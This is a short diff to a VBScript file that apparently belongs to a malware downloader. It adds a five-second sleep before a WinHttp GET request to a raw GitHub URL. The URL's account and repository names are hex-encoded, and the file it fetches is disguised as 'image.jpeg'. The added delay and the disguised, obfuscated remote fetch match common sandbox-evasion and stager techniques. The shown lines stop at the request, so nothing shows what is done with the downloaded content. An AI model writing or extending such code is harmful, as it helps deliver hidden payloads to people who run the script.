@@ -1,3 +1,4 @@
+WScript.Sleep(5000)
 Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
 URL = "https://raw.githubusercontent.com/736f636865617461/616e676b6f72776174/main/image.jpeg"
 objWinHttp.open "GET", URL, False
